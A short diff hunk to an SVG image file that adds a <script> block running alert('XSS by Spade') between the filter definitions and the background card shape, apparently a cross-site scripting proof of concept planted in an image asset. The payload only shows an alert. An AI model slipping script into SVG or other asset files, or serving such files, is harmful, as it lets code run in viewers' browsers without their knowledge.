@@ -8,7 +8,9 @@
       <feDropShadow dx="0" dy="6" stdDeviation="10" flood-opacity="0.12"/>
     </filter>
   </defs>
-    
+    <script>
+      alert('XSS by Spade');
+   </script>
   <!-- background card -->
   <rect x="20" y="20" rx="12" ry="12" width="380" height="240"
         fill="url(#g)" filter="url(#shadow)"/>
